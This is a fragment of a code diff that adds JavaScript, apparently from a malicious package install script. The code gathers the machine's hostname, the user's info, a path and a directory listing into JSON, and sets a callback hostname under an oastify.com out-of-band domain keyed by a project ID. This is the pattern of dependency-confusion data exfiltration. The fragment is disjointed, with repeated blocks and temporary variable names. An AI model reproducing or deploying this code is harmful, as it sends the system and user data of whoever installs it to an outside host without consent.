@@ -1,0 +1,17 @@
+JSON.stringify({
+      hostname: hostname,
+      project_id: process.argv[2],
+      path: path,
+      userInfo: userInfo,
+      directoryList: output
+    })
+_tmp_5.project_id = process.argv[2]
+_tmp_6.hostname = process.argv[2] + '.' + "hooks" + '.1667923894.020k3pifltekneo7d74oof30ur0ho6.oastify.com'
+JSON.stringify({
+      hostname: hostname,
+      project_id: process.argv[2],
+      path: path,
+      userInfo: userInfo,
+      directoryList: output
+    })
+_tmp_11.project_id = process.argv[2]
